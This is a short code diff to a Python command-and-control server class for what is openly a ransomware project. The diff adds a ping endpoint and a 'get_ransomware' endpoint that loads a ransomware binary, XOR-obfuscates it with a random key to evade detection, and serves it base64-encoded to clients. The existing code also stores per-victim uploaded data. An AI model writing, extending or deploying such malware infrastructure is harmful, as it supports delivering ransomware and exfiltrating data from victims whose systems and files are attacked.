@@ -2,11 +2,13 @@ import base64
 from hashlib import sha256
 from http.server import HTTPServer
 import os
+from xorcrypt import xorcrypt 
 
 from cncbase import CNCBase
 
 class CNC(CNCBase):
     ROOT_PATH = "/root/CNC"
+    RANSOMWARE_PATH = "/root/dist"
 
     def save_b64(self, token:str, data:str, filename:str):
         # helper
@@ -16,6 +18,9 @@ class CNC(CNCBase):
         path = os.path.join(CNC.ROOT_PATH, token, filename)
         with open(path, "wb") as f:
             f.write(bin_data)
+
+    def get_ping(self, path: str, params: dict, body: dict) -> dict:
+        return {"status": "OK"}
 
     def post_new(self, path: str, params: dict, body: dict) -> dict:
         print("body", body)
@@ -51,6 +56,13 @@ class CNC(CNCBase):
             f.write(base64.b64decode(file_data))
 
         return {"status": "OK"}
+    
+    def get_ransomware(self, path: str, params: dict, body: dict) -> dict:
+        with open(os.path.join(self.RANSOMWARE_PATH, "ransomware"), "rb") as f:
+            #random key for obfuscation
+            key = os.urandom(32)
+            file = xorcrypt(f.read(), key)
+            return {"status": "OK", "data": base64.b64encode(file).decode(), "key": base64.b64encode(key).decode()}
 
 
 
